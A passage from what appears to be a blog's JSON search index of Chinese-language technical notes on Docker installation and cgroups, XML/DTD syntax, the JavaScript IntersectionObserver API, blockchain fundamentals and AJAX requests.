\\\rgcr.io/cadvisor/cadvisor:$VERSION\r访问http://localhost:8080\n容器的资源限制通过/sys/fs/cgroup/memory/docker下的，目录名为容器id，其中memory.limit_in_bytes是该容器的内存限制文件，memory.usage_in_bytes是该容器的内存使用情况，proc/容器的pid/net/dev是该容器的网络使用情况，cpuset.cpus是cpu限制使用核数，cpu.cfs_period_us是一个cpu核心的带宽（单位微秒，容器的cpu总带宽=cpu核心数*单个cpu核心的带宽），cpu.cfs_quota_us是可使用cpu带宽（单位微秒，-1为不限制）\n容器监控工具实质上是通过读取和记录宿主的文件来显示容器资源情况的，所以启动容器监控工具，要映射数据卷/sys:到容器中\nkubernetes简称k8s，用来自动化容器的部署，监控，容器负载均衡等等\nmaster是容器集群的控制系统，可以用来监控容器的状态，调度负载均衡\nnode是k8s的工作节点，可以接收master的指令，根据指令来创建和销毁Pod等等\nPod是容器的容器，可以包含多个容器，是k8s中最小的可部署单元，pod内部的网络是互通的，每一个pod都有自己的虚拟ip\nk8s将弃用dockershim（dockershim是k8s内置的一个组件，该组件可让k8s能够通过CRI（Container Runtime Interface）来操作docker）\n安装docker\n配置docker\n添加docker官方GPGkey\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\nsudo apt-key fingerprint 0EBFCD88\n安装依赖\nsudo apt install apt-transport-https ca-certificates curl software-properties-common\n设置docker仓库\nsudo add-apt-repository \u0026ldquo;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\u0026rdquo;\n重新加载源\nsudo apt update\n如果报错，可以手动在/etc/apt/source.list添加\ndeb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable\nsudo apt dist-upgrade（智能处理包依赖，会自己安装新软件或者删除原有软件包来完成升级）\n安装docker\nsudo apt install docker-ce docker-ce-cli containerd.io\n","permalink":"https://99999.fun/posts/18/","summary":"docker是一个应用容器，可以将应用以及该应用的依赖打包到一个可以移植的容器中，应用在这个容器中运行\n可以进行转移，修改，版本管理等操作，不用担心应用转移到别的服务器会出现依赖问题\n将容器文件转移到别的服务器上，不会影响到容器，一次配置，可以在多个服务器上使用相同的环境\n在以前，根本不可能实现或者保障一个服务器是运行多个应用，直到虚拟机的出现，虚拟机可以让空闲的服务器部署新的应用，但是虚拟机依赖于操作系统，操作系统又会占用CPU和内存，以及存储，而且虚拟机的移植性差启动缓慢，直到容器的出现\n运行在相同的宿主机的容器是共享一个操作系统的，而且容器具备启动快，移植性强的特点（不用担心本地运行好好的，到生产环境就出一堆问题）\ndocker的多数项目和工具是使用golang编写的\nDocker容器技术高度依赖于Linux内核，不管是在windwos或者Mac OS上都不是真正的容器化（只有在Linux系统上才能实现无虚拟化的真正容器化），都是在虚拟化Linux之后，在Linux虚拟机的基础上实现的\nDocker三大件：镜像，容器，仓库\n镜像被用来创建容器（而且镜像文件是复用，只可读的）\n容器是镜像文件的实例，容器与容器之间是隔离的，容器可被启动，查看，暂停，退出，重启，删除\n仓库是集中存储镜像文件的地方，Docker官方仓库：https://hub.docker.com/\nDocker官网文档：https://docs.docker.com/\nDocker是基于C/S架构（Client-Server）的系统，Docker的守护进程（Docker Daemon）运行在服务端上，客户端通过Docker Client和守护进程建立通信，守护进程可以接收客户端发送的指令并且可以管理服务端的容器\nDocker Engine（引擎）会执行客户端发送的指令，来执行Docker内部的工作，每一项工作以Job的形式存在（一个job表示一个工作任务）\n如果job（工作任务）需要镜像时，会从Docker Registry中下载获取镜像（如果本地存在则从本地获取，如果没有再从远程仓库获取）\n当Docker容器需要创建网络环境时，通过Network driver创建并且配置Docker容器网络环境（通过网桥来暴露对外的端口和ip）\n如果需要限制Docker容器运行资源或者执行用户指令时，通过Exec driver完成\n网络的配置以及Exec driver的实现都是通过Libcontainer来实现的，Libcontainer是用来管理容器的包，该包基于go语言开发的，像创建容器，删除容器等等都可通过Libcontainer完成\n安装docker（环境为ubuntu20.04）\n如果之前安装过docker，需要先卸载\nsudo apt remove docker docker-engine docker.io containerd runc\ndocker官方推荐使用docker的存储库来安装或者升级，而不是通过脚本或者通过下载deb软件的方式来安装\n安装依赖\nsudo apt install ca-certificates curl gnupg lsb-release\n配置docker官方的GPG密钥\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg \u0026ndash;dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n配置稳定Docker CE源\nsudo add-apt-repository \u0026ldquo;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable\u0026rdquo;\n安装docker引擎\nsudo apt install docker-ce docker-ce-cli containerd.","title":"Docker容器的简单使用"},{"content":"xml中文全称为可扩展标记语言（Extensible Markup Language）\nxml和html类似，但是xml是用来传输和存储数据的，xml大小写敏感，xml的标记是自定义的\nxml声明，该声明位在xml文档的第一行，结尾\nversion属性表示xml的版本，encoding属性表示该xml文档的编码方式，standalone属性表示该文档是否为独立，no表示依赖于外部文档\nxml的标记也可以像html一样，认为是元素，一般由开始标签，属性，内容，结束标签组成，例如xml\n和就是xml文档中的标签（元素），和html一样，可以嵌套n个子元素，如果一个元素没有被嵌套到其他元素上，那么这个元素就是根元素\n一般来说一个格式良好的xml文档只有一个根元素，而且根元素是xml文档的第一个元素，如果一个元素没有嵌套子元素也没有内容，那么这个元素为空元素，空元素不需要结束标签，例如\n属性是元素的描述和说明，可以使用多个属性，每个属性都有自己名称和值，值用\u0026quot;\u0026ldquo;或者\u0026rsquo;\u0026lsquo;包起来\nxml的注释方式和html一样，\nDTD约束\nXML是自定义标签，浏览器不知道这个标签是用来干什么的，因此制定的一套约束，遵循一定的语法\nDTD约束写在一个DTD文件里，dtd导入，例如：\n如果导入了本地的DTD文档，那么standalone属性的值不能为yes\nDTD除了导入外，还可以内嵌，例如\n元素内容包括元素的声明，包括数据类型和符号\nPCDATA 中文意思就是被解析的字符数据，会被解析器解析\n子元素 例如\n空元素 一般用来定义空元素\nANY 表示这个元素没有包含任何字符数据和子元素，例如，在实际开发中，尽量不要使用ANY，除了根元素外，其他使用ANY的元素会失去DTD对XML的约束\n符号\n问号?:表示该对象可以出现0次或者1次 星号*:表示该对象可以出现0次或者多次 加号+:表示该对象可以出现1次或者多次 竖线|:表示在列出的对象中选择一个 逗号,:表现对象必须按照指定的顺序出现 括号():用于给元素进行分组\nDTD除了给定义元素外，也可以为元素定义属性\n属性类型指定该属性是属性哪个类型的，属性说明一般用来说明该属性是否必须出现\n属性类型\nCDTATA // 表示属性类型为字符数据，如果想在属性设置值中出现特殊符号（例如\u0026lt;），那么需要使用其转义字符序列来表示，例如 \u0026ldquo;\u0026lt;\u0026ldquo;来表示\u0026rdquo;\u0026lt;\u0026rdquo;\nEnumerated(枚举类型) // 在声明一个属性时，可以限制该属性的取值只能从一个列表中选择，但是在DTD文档中不会出现Enumerated关键字，用法例如：\nID // 表示该属性类型为唯一标识，一个元素只能有一个id类型的属性，而且属性说明必须为REQUIRED或者IMPLIED\nIDREF和IDREFS // 一般用来关联元素与元素之间的关系，而且IDREF类型的属性的值必须为一个已经存在的ID类型的属性值，例如：\n1 2\n说明ID为01和02的元素之间，存在关联\nIDREFS就是引用多个ID类型的属性值，例如：\n1\n属性说明\nREQUIRED // 表示这个元素的这个属性是必须的\nIMPLIED // 表示这个元素可以包含这个属性，也可以不包含\nFIXED // 表示这个固定的属性默认值，不能将该属性的值设置为其他值，使用该说明时还需要提供一个默认值，如果XML没有定义该属性，那么其值就被自动设置为DTD定义的默认值\n默认值 // 和FIXED一样，不同的是，这个属性的值可以改变，如果在xml文档中设置了新的值，那么新的值会覆盖DTD定义的默认值\n","permalink":"https://99999.fun/posts/17/","summary":"xml中文全称为可扩展标记语言（Extensible Markup Language）\nxml和html类似，但是xml是用来传输和存储数据的，xml大小写敏感，xml的标记是自定义的\nxml声明，该声明位在xml文档的第一行，结尾\nversion属性表示xml的版本，encoding属性表示该xml文档的编码方式，standalone属性表示该文档是否为独立，no表示依赖于外部文档\nxml的标记也可以像html一样，认为是元素，一般由开始标签，属性，内容，结束标签组成，例如xml\n和就是xml文档中的标签（元素），和html一样，可以嵌套n个子元素，如果一个元素没有被嵌套到其他元素上，那么这个元素就是根元素\n一般来说一个格式良好的xml文档只有一个根元素，而且根元素是xml文档的第一个元素，如果一个元素没有嵌套子元素也没有内容，那么这个元素为空元素，空元素不需要结束标签，例如\n属性是元素的描述和说明，可以使用多个属性，每个属性都有自己名称和值，值用\u0026quot;\u0026ldquo;或者\u0026rsquo;\u0026lsquo;包起来\nxml的注释方式和html一样，\nDTD约束\nXML是自定义标签，浏览器不知道这个标签是用来干什么的，因此制定的一套约束，遵循一定的语法\nDTD约束写在一个DTD文件里，dtd导入，例如：\n如果导入了本地的DTD文档，那么standalone属性的值不能为yes\nDTD除了导入外，还可以内嵌，例如\n元素内容包括元素的声明，包括数据类型和符号\nPCDATA 中文意思就是被解析的字符数据，会被解析器解析\n子元素 例如\n空元素 一般用来定义空元素\nANY 表示这个元素没有包含任何字符数据和子元素，例如，在实际开发中，尽量不要使用ANY，除了根元素外，其他使用ANY的元素会失去DTD对XML的约束\n符号\n问号?:表示该对象可以出现0次或者1次 星号*:表示该对象可以出现0次或者多次 加号+:表示该对象可以出现1次或者多次 竖线|:表示在列出的对象中选择一个 逗号,:表现对象必须按照指定的顺序出现 括号():用于给元素进行分组\nDTD除了给定义元素外，也可以为元素定义属性\n属性类型指定该属性是属性哪个类型的，属性说明一般用来说明该属性是否必须出现\n属性类型\nCDTATA // 表示属性类型为字符数据，如果想在属性设置值中出现特殊符号（例如\u0026lt;），那么需要使用其转义字符序列来表示，例如 \u0026ldquo;\u0026lt;\u0026ldquo;来表示\u0026rdquo;\u0026lt;\u0026rdquo;\nEnumerated(枚举类型) // 在声明一个属性时，可以限制该属性的取值只能从一个列表中选择，但是在DTD文档中不会出现Enumerated关键字，用法例如：\nID // 表示该属性类型为唯一标识，一个元素只能有一个id类型的属性，而且属性说明必须为REQUIRED或者IMPLIED\nIDREF和IDREFS // 一般用来关联元素与元素之间的关系，而且IDREF类型的属性的值必须为一个已经存在的ID类型的属性值，例如：\n1 2\n说明ID为01和02的元素之间，存在关联\nIDREFS就是引用多个ID类型的属性值，例如：\n1\n属性说明\nREQUIRED // 表示这个元素的这个属性是必须的\nIMPLIED // 表示这个元素可以包含这个属性，也可以不包含\nFIXED // 表示这个固定的属性默认值，不能将该属性的值设置为其他值，使用该说明时还需要提供一个默认值，如果XML没有定义该属性，那么其值就被自动设置为DTD定义的默认值\n默认值 // 和FIXED一样，不同的是，这个属性的值可以改变，如果在xml文档中设置了新的值，那么新的值会覆盖DTD定义的默认值","title":"XML学习笔记"},{"content":"IntersectionObserver是浏览器本身提供的构造函数，因此可能有一些老版本浏览器没有效果\n该构造函数提供了一种异步的监测目标对象和祖先对象或者视口相交的方法\nvar observe = new IntersectionObserver(callback, options)\n例如上面，该函数可以传入两个参数，callback是当可视性发生改变时执行回调函数，options是配置对象\n使用该构造函数生成的实例中有3个观察器实例，分别是observe（开始监测），unobserve（停止监测），disconnect（关闭监测），其中observe的参数是dom对象\n当监测目标对象的可视性发生改变时调用callback参数中的回调函数\noptions参数：主要是设置观测的对象和观测值，该参数中有三个键值对\nroot指的是观测对象的根元素，默认是浏览器视口，值要么是根元素，要么就是观测对象的父元素\nrootMargin指的是用于扩大或者缩小视口的大小\nthreshold指的是交叉的比例，主要决定什么时候触发回调函数，是数组，默认值为0\ncallback参数中的回调函数一般会被调用两次，一次是当监测对象可视性满足了threshold指定的值，还有一次就是监测对象不满足threshold指定的值\nIntersectionObserverEntry对象\n该对象提供了监测对象的信息，有七个属性\nboundingClientRect：返回目标的矩形信息\nintersectionRatio：返回相交时和目标的比例值，不可视时小于等于0\nintersectionRect：返回目标和视口相交的矩形信息\nisIntersecting：返回目标当前是否可视，可视为true（返回值为布尔值）\nrootBounds：返回根元素的矩形信息，没有指定根元素则返回当前视口的矩形信息\ntarget：返回观测的目标对象，是dom对象\ntime：返回一个记录了从观测开始到交叉被触发时间的的时间戳，单位为毫秒\n如果是搞懒加载，那么intersectionRatio和isIntersecting是关键点\n例如：\nconst lazyload = new IntersectionObserver((target)=\u0026gt;{\r// 实例化\rtarget.forEach((item) =\u0026gt;{\rif (item.intersectionRatio){\r// 当目标可视\ritem.target.src = item.target.alt; // 进行属性值覆盖\rlazyload.unobserve(item.target) // 停止观测\r}\r})\r},{\rrootMargin: \u0026quot;100px\u0026quot; // 提前100px\r}); const imgs = document.querySelectorAll(\u0026quot;img[alt]\u0026quot;); // 选择带有alt属性的img元素\rimgs.forEach((item) =\u0026gt; {\rlazyload.observe(item)\r// 开始观测\r}); ","permalink":"https://99999.fun/posts/16/","summary":"IntersectionObserver是浏览器本身提供的构造函数，因此可能有一些老版本浏览器没有效果\n该构造函数提供了一种异步的监测目标对象和祖先对象或者视口相交的方法\nvar observe = new IntersectionObserver(callback, options)\n例如上面，该函数可以传入两个参数，callback是当可视性发生改变时执行回调函数，options是配置对象\n使用该构造函数生成的实例中有3个观察器实例，分别是observe（开始监测），unobserve（停止监测），disconnect（关闭监测），其中observe的参数是dom对象\n当监测目标对象的可视性发生改变时调用callback参数中的回调函数\noptions参数：主要是设置观测的对象和观测值，该参数中有三个键值对\nroot指的是观测对象的根元素，默认是浏览器视口，值要么是根元素，要么就是观测对象的父元素\nrootMargin指的是用于扩大或者缩小视口的大小\nthreshold指的是交叉的比例，主要决定什么时候触发回调函数，是数组，默认值为0\ncallback参数中的回调函数一般会被调用两次，一次是当监测对象可视性满足了threshold指定的值，还有一次就是监测对象不满足threshold指定的值\nIntersectionObserverEntry对象\n该对象提供了监测对象的信息，有七个属性\nboundingClientRect：返回目标的矩形信息\nintersectionRatio：返回相交时和目标的比例值，不可视时小于等于0\nintersectionRect：返回目标和视口相交的矩形信息\nisIntersecting：返回目标当前是否可视，可视为true（返回值为布尔值）\nrootBounds：返回根元素的矩形信息，没有指定根元素则返回当前视口的矩形信息\ntarget：返回观测的目标对象，是dom对象\ntime：返回一个记录了从观测开始到交叉被触发时间的的时间戳，单位为毫秒\n如果是搞懒加载，那么intersectionRatio和isIntersecting是关键点\n例如：\nconst lazyload = new IntersectionObserver((target)=\u0026gt;{\r// 实例化\rtarget.forEach((item) =\u0026gt;{\rif (item.intersectionRatio){\r// 当目标可视\ritem.target.src = item.target.alt; // 进行属性值覆盖\rlazyload.unobserve(item.target) // 停止观测\r}\r})\r},{\rrootMargin: \u0026quot;100px\u0026quot; // 提前100px\r}); const imgs = document.querySelectorAll(\u0026quot;img[alt]\u0026quot;); // 选择带有alt属性的img元素\rimgs.forEach((item) =\u0026gt; {\rlazyload.observe(item)\r// 开始观测\r}); ","title":"JavaScript-IntersectionObserver构造函数笔记"},{"content":"注意：不推荐去玩比特币以及类似的加密货币，那个玩意说涨就涨，说跌就跌，比特币实质上就是一串数字，没有实物，没有信用背书，当这个巨大泡沫破裂之时，大部分人绝对不可能及时套现跑路，了解比特币下的技术可以，但是绝对不能接触或者玩比特币以及类似的加密货币\n1个比特币相当于100000000聪,聪(Satoshi)是比特币目前最小的单位，是为了纪念比特币的创建者中本聪(Satoshi Nakamoto)\n在中国唯一值得信赖的加密货币是数字人民币，有国家在做信用背书，是有法偿能力的法定货币，和现金等值\n区块链技术诞生于比特币，而比特币的诞生又来源于一位叫中本聪的一篇文章（比特币：一种点对点的电子现金系统）\n区块链的一个特点就是去中心化，中心化指的是数据中心化，例如支付宝和微信，那些支付的数据全部集中在数据库中，确保交易用户的余额一增一减\n而区块链技术就是把数据全部公开，区块链中的每一个节点都可以获得一份完整的区块链，而且全部都是相同的数据，如果篡改了其中一份数据，那么这份数据会和其他节点的数据对比，如果不相同，那么这份数据是不被其他节点承认的\n而需要伪造一个区块链需要拥有超过全网51%的（节点）算力\n区块链是一个个区块组成的有序链表，区块中记录着一系列信息，每个区块都指向前一个区块，每个区块都有一个哈希标识（又被称为区块哈希），区块链的不可篡改的特性就是由哈希算法提供的（哈希是单向的，哈希算法可以将一段数据计算出一个哈希值，而哈希值不能反推出加密前的数据，只能暴力穷举）\n如果两份数据的哈希值相同，那么这两个哈希值的数据就是相同的，只要改动了原始数据任意的数据，那怕只修改一个字节，都会改变哈希值\n常见的哈希算法\nMD5：128位，16字节\nSHA-1：160位，20字节\nSHA-256：256位，32子节\nSHA-512：512位，64子节\nRipeMD160：160位，20子节\n哈希函数：Hash(原始数据) = 摘要数据（哈希值）\n比特币使用的哈希算法有两种，一种是双重SHA-256（将数据进行两次SHA-256计算），另一种就是先将数据进行SHA-256计算，再将处理过的数据再进行一次RipeMD160计算\n区块的头部有一个Merkle Hash字段，记录了该区块的全部交易的哈希树（全部交易的数据通过哈希算法处理为一个汇总的哈希值）\n例如：当一个区块中有好几个交易，然后将一对一对的交易数据做差异哈希算法（dhash），得到两个哈希值，将这两个哈希值拼起来，计算出下一层的哈希值，一层一层计算，最后的得到的哈希值就是Merkle Hash\n那么如果每一层是单数，那么将每一层的最后的一个数据复制一份，最后计算出最终值\n区块本身使用Merkle Hash来表示，而区块本身的哈希值是没有记录在区块头部的，需要通过计算区块头部的数据得到\n区块头部的Prev Hash记录了上一个区块的哈希值（不是Merkle Hash，而是区块本身的哈希值），可以通过Prev Hash来追踪到上一个区块，每个区块的Prev Hash都会指向自己的上一个区块，一直反复下去，一直到区块链的第一个区块（创世区块，该区块没有上一个区块）\n从对Merkle Hash的计算方法和对区块头部来追踪到上一个区块的方法得出，只要篡改其中任意一个交易的数据（哪怕是一字节的改动）都会让Merkle Hash验证失败，那么这个区块就是无效的，只能重新计算Merkle Hash，然后这个区块本身的哈希值就改变，因此下一个区块指向该区块的链接也断了\n篡改一个区块，需要重新计算这个区块的本身的哈希值，然后将下一个的所有区块全部计算并且伪造，才能篡改整个区块链，难度极高，因为区块链是不断增长的，修改的难度也会越来越难，而挖矿实质上就是重新计算区块头部的哈希值，直到于哈希值匹配，挖矿本身的要求就已经很高了，更不用说篡改整个区块链了\n比特币交易中使用了一种名叫点对点交易，就是用户对用户，这个交易的特点就是去中心化，整个交易全部依赖于数学加密\n用到一个叫公钥和私钥，地址的概念，公钥是可以根据私钥计算出来的，而私钥就不能通过公钥计算出来，因此私钥很重要，不能泄露\n地址的计算方法\nHash(Hash(fun(私钥))) = 地址\n而需要不通过泄露私钥的情况下，表明拥有某个私钥，需要用到签名，先将交易信息进行哈希计算，然后签名计算，sign(\u0026lsquo;交易信息的哈希值\u0026rsquo;,\u0026lsquo;私钥\u0026rsquo;)，最后得到一个签名值\n而进行付款时，会向区块链的节点进行广播，广播信息包括，交易信息和签名值，而验证签名信息的确是某个私钥的，验证过程例如：\nverify(\u0026lsquo;签名值\u0026rsquo;,\u0026lsquo;付款方地址\u0026rsquo;)，获得的值为交易的哈希值\nif(verify(\u0026lsquo;签名值\u0026rsquo;,\u0026lsquo;付款方地址\u0026rsquo;) == hash(\u0026rsquo;{交易信息}\u0026rsquo;))\n如果当某一个节点验证通过，那么该节点也会进行再一次的广播\n交易信息中没有包含任何个人的信息，因此区块链具有匿名性\n而比特币的交易是根据私钥来验证的，只要不泄露私钥，那么比特币的账户是安全的，私钥破解，私钥的个数有2的256次方，相当于人类可观测宇宙的原子数，根据当前计算机的计算速度，根本不可能碰撞出来，除非倒霉到碰撞第一次就匹配到了\n挖矿：将交易记录，交易的时间，以及序号等等数据进行哈希打包的节点就是矿工节点，而完成哈希打包任务，并且认为其有效的，就会获得比特币奖励\n一段时间内只能一个矿工节点成功记账，并且被证明为有效的，这个时间一般为10分钟，奖励比特币的机制为每4年减半\n而且需要进行POW工作量证明竞争来获得记账权（也就是传说中的挖矿，因为要进行大量的计算，因此挖矿需要大量的算力，竞争该记账权是具有一定随机性的）\n其他节点复制记账结果（也会获得比特币奖励）\nPOW工作量证明\nHash(上一个Hash值,交易记录集,随机数)= 哈希值\n而比特币中有个机制，哈希值要小于某个目标值，因此需要不断修改随机数的值，比特币因为矿工节点越来越多，挖取比特币的难度也会越来越难，难度越难，那么目标值就越小\n交易记录集：收集广播中还没有被记录账本的交易，交易的有效性验证，添加给自己转账的交易（挖矿奖励）\n目前比特币的共识机制：优先选择工作量最大的区块链，最长的区块链，因此矿工会延长计算，已确保自己是工作量是最大最长的\n如果两条链被广播到其他节点，因为网络具有不确定性，有可能某个节点会先收到某个链，在这个链上挖矿，从而导致链出现分叉，如果两个链都同时收到，那么会优先选择工作量最大的区块链，另一个链为备用链保存\n解决分叉：如果当前链的上一级链更长的话，优先选择，而短一点的链会被抛弃\n分叉分为硬分叉和软分叉\n硬分叉：区块链发生永久性改变，在新共识发布后，那些没有更新的节点无法验证已经升级的节点的所产生的区块，改变挖矿难度\n软分叉：区块链发生改变，但是不会像硬分叉那样影响没有更新的节点，旧节点会兼容新节点，但是新节点不兼容旧节点而已\n解决分叉的方法就是所有矿工都遵从同样的机制（升级机制，保证机制为最新），而且那些没有遵从的就会发生分叉\n最经典的例子就是拜占庭将军问题\n主要讲的是：拜占庭帝国去攻击一个敌人，派了10支军队，要将这个敌人打败需要至少6支军队，而且必须在分散包围状态下同时攻击，需要依靠通信兵来进行传递信息，但是不清楚这些通信兵或者将军中是否有叛徒，而这些叛徒可能会传递假消息来导致进攻失败，而拜占庭将军们需要在这种分布式下进行传递消息\n而在区块链中，完美解决这个问题，进行区块链广播需要进行POW工作量证明，而且限制一段时间内只允许一个账号能广播，降低了虚假信息传播的量和成本，而且进行广播需要进行不可伪造的签名（私钥和公钥），每隔一段时间，信息就进行更新，节点进行验证，根本不让虚假信息的传播发送成功得逞，不可逆的哈希算法加密加上信息传递速度的限制，把区块链打造成了一个无需信任的数据信息交互平台\n假如：将军a发送进攻消息给将军b，为了防止信息泄露，使用非对称加密算法将消息进行加密，因为将军b的公钥是公开的，也就可以使用将军b的公钥进行信息加密，而将军b只能使用他的私钥进行解密，因为使用公钥加密的信息，可以通过私钥进行解密，主要是保护信息是完整的，但是依然可以传递虚假的信息给将军b（因为公钥是公开的，谁都可以进行公钥加密），因此，为了证明是将军a发的，还需要在信息上加签名，也就是将私钥加密成一个签名，然后将军b得到这个签名，需要将这个签名和将军a的公钥来验证，来确定发送这个消息的人的身份\n","permalink":"https://99999.fun/posts/15/","summary":"注意：不推荐去玩比特币以及类似的加密货币，那个玩意说涨就涨，说跌就跌，比特币实质上就是一串数字，没有实物，没有信用背书，当这个巨大泡沫破裂之时，大部分人绝对不可能及时套现跑路，了解比特币下的技术可以，但是绝对不能接触或者玩比特币以及类似的加密货币\n1个比特币相当于100000000聪,聪(Satoshi)是比特币目前最小的单位，是为了纪念比特币的创建者中本聪(Satoshi Nakamoto)\n在中国唯一值得信赖的加密货币是数字人民币，有国家在做信用背书，是有法偿能力的法定货币，和现金等值\n区块链技术诞生于比特币，而比特币的诞生又来源于一位叫中本聪的一篇文章（比特币：一种点对点的电子现金系统）\n区块链的一个特点就是去中心化，中心化指的是数据中心化，例如支付宝和微信，那些支付的数据全部集中在数据库中，确保交易用户的余额一增一减\n而区块链技术就是把数据全部公开，区块链中的每一个节点都可以获得一份完整的区块链，而且全部都是相同的数据，如果篡改了其中一份数据，那么这份数据会和其他节点的数据对比，如果不相同，那么这份数据是不被其他节点承认的\n而需要伪造一个区块链需要拥有超过全网51%的（节点）算力\n区块链是一个个区块组成的有序链表，区块中记录着一系列信息，每个区块都指向前一个区块，每个区块都有一个哈希标识（又被称为区块哈希），区块链的不可篡改的特性就是由哈希算法提供的（哈希是单向的，哈希算法可以将一段数据计算出一个哈希值，而哈希值不能反推出加密前的数据，只能暴力穷举）\n如果两份数据的哈希值相同，那么这两个哈希值的数据就是相同的，只要改动了原始数据任意的数据，那怕只修改一个字节，都会改变哈希值\n常见的哈希算法\nMD5：128位，16字节\nSHA-1：160位，20字节\nSHA-256：256位，32子节\nSHA-512：512位，64子节\nRipeMD160：160位，20子节\n哈希函数：Hash(原始数据) = 摘要数据（哈希值）\n比特币使用的哈希算法有两种，一种是双重SHA-256（将数据进行两次SHA-256计算），另一种就是先将数据进行SHA-256计算，再将处理过的数据再进行一次RipeMD160计算\n区块的头部有一个Merkle Hash字段，记录了该区块的全部交易的哈希树（全部交易的数据通过哈希算法处理为一个汇总的哈希值）\n例如：当一个区块中有好几个交易，然后将一对一对的交易数据做差异哈希算法（dhash），得到两个哈希值，将这两个哈希值拼起来，计算出下一层的哈希值，一层一层计算，最后的得到的哈希值就是Merkle Hash\n那么如果每一层是单数，那么将每一层的最后的一个数据复制一份，最后计算出最终值\n区块本身使用Merkle Hash来表示，而区块本身的哈希值是没有记录在区块头部的，需要通过计算区块头部的数据得到\n区块头部的Prev Hash记录了上一个区块的哈希值（不是Merkle Hash，而是区块本身的哈希值），可以通过Prev Hash来追踪到上一个区块，每个区块的Prev Hash都会指向自己的上一个区块，一直反复下去，一直到区块链的第一个区块（创世区块，该区块没有上一个区块）\n从对Merkle Hash的计算方法和对区块头部来追踪到上一个区块的方法得出，只要篡改其中任意一个交易的数据（哪怕是一字节的改动）都会让Merkle Hash验证失败，那么这个区块就是无效的，只能重新计算Merkle Hash，然后这个区块本身的哈希值就改变，因此下一个区块指向该区块的链接也断了\n篡改一个区块，需要重新计算这个区块的本身的哈希值，然后将下一个的所有区块全部计算并且伪造，才能篡改整个区块链，难度极高，因为区块链是不断增长的，修改的难度也会越来越难，而挖矿实质上就是重新计算区块头部的哈希值，直到于哈希值匹配，挖矿本身的要求就已经很高了，更不用说篡改整个区块链了\n比特币交易中使用了一种名叫点对点交易，就是用户对用户，这个交易的特点就是去中心化，整个交易全部依赖于数学加密\n用到一个叫公钥和私钥，地址的概念，公钥是可以根据私钥计算出来的，而私钥就不能通过公钥计算出来，因此私钥很重要，不能泄露\n地址的计算方法\nHash(Hash(fun(私钥))) = 地址\n而需要不通过泄露私钥的情况下，表明拥有某个私钥，需要用到签名，先将交易信息进行哈希计算，然后签名计算，sign(\u0026lsquo;交易信息的哈希值\u0026rsquo;,\u0026lsquo;私钥\u0026rsquo;)，最后得到一个签名值\n而进行付款时，会向区块链的节点进行广播，广播信息包括，交易信息和签名值，而验证签名信息的确是某个私钥的，验证过程例如：\nverify(\u0026lsquo;签名值\u0026rsquo;,\u0026lsquo;付款方地址\u0026rsquo;)，获得的值为交易的哈希值\nif(verify(\u0026lsquo;签名值\u0026rsquo;,\u0026lsquo;付款方地址\u0026rsquo;) == hash(\u0026rsquo;{交易信息}\u0026rsquo;))\n如果当某一个节点验证通过，那么该节点也会进行再一次的广播\n交易信息中没有包含任何个人的信息，因此区块链具有匿名性\n而比特币的交易是根据私钥来验证的，只要不泄露私钥，那么比特币的账户是安全的，私钥破解，私钥的个数有2的256次方，相当于人类可观测宇宙的原子数，根据当前计算机的计算速度，根本不可能碰撞出来，除非倒霉到碰撞第一次就匹配到了\n挖矿：将交易记录，交易的时间，以及序号等等数据进行哈希打包的节点就是矿工节点，而完成哈希打包任务，并且认为其有效的，就会获得比特币奖励\n一段时间内只能一个矿工节点成功记账，并且被证明为有效的，这个时间一般为10分钟，奖励比特币的机制为每4年减半\n而且需要进行POW工作量证明竞争来获得记账权（也就是传说中的挖矿，因为要进行大量的计算，因此挖矿需要大量的算力，竞争该记账权是具有一定随机性的）\n其他节点复制记账结果（也会获得比特币奖励）\nPOW工作量证明\nHash(上一个Hash值,交易记录集,随机数)= 哈希值\n而比特币中有个机制，哈希值要小于某个目标值，因此需要不断修改随机数的值，比特币因为矿工节点越来越多，挖取比特币的难度也会越来越难，难度越难，那么目标值就越小\n交易记录集：收集广播中还没有被记录账本的交易，交易的有效性验证，添加给自己转账的交易（挖矿奖励）\n目前比特币的共识机制：优先选择工作量最大的区块链，最长的区块链，因此矿工会延长计算，已确保自己是工作量是最大最长的\n如果两条链被广播到其他节点，因为网络具有不确定性，有可能某个节点会先收到某个链，在这个链上挖矿，从而导致链出现分叉，如果两个链都同时收到，那么会优先选择工作量最大的区块链，另一个链为备用链保存\n解决分叉：如果当前链的上一级链更长的话，优先选择，而短一点的链会被抛弃\n分叉分为硬分叉和软分叉\n硬分叉：区块链发生永久性改变，在新共识发布后，那些没有更新的节点无法验证已经升级的节点的所产生的区块，改变挖矿难度\n软分叉：区块链发生改变，但是不会像硬分叉那样影响没有更新的节点，旧节点会兼容新节点，但是新节点不兼容旧节点而已\n解决分叉的方法就是所有矿工都遵从同样的机制（升级机制，保证机制为最新），而且那些没有遵从的就会发生分叉\n最经典的例子就是拜占庭将军问题\n主要讲的是：拜占庭帝国去攻击一个敌人，派了10支军队，要将这个敌人打败需要至少6支军队，而且必须在分散包围状态下同时攻击，需要依靠通信兵来进行传递信息，但是不清楚这些通信兵或者将军中是否有叛徒，而这些叛徒可能会传递假消息来导致进攻失败，而拜占庭将军们需要在这种分布式下进行传递消息","title":"简单理解区块链的基本原理"},{"content":"ajax请求是异步的，因此可以通过回调函数来处理响应\n实现ajax请求大多是使用XMLHttpRequest对象，该对象用于与服务器交互，可以在不刷新页面的情况下请求url，获取数据，从而达到更新页面内容的目的\n初始化XMLHttpRequest()构造函数，可以获得一个XMLHttpReques实例，例如：\nvar xmlhttp = new XMLHttpRequest()\rxmlhttp.onreadystatechange = function(){\rif(xmlhttp.readyState == 4 \u0026amp;\u0026amp; xmlhttp.status == 200){\rdocument.getElementById(\u0026quot;app\u0026quot;).innerHTML = xmlhttp.responseText\r}\r}\rconsole.log(xmlhttp.readyState) // 0\rxmlhttp.open(\u0026quot;GET\u0026quot;,\u0026quot;https://httpbin.org/get\u0026quot;,true)\rconsole.log(xmlhttp.readyState) // 1\rxmlhttp.onprogress =function(){\rconsole.log(xmlhttp.readyState) // 3\r}\rxmlhttp.onload = function(){\rconsole.log(xmlhttp.readyState) // 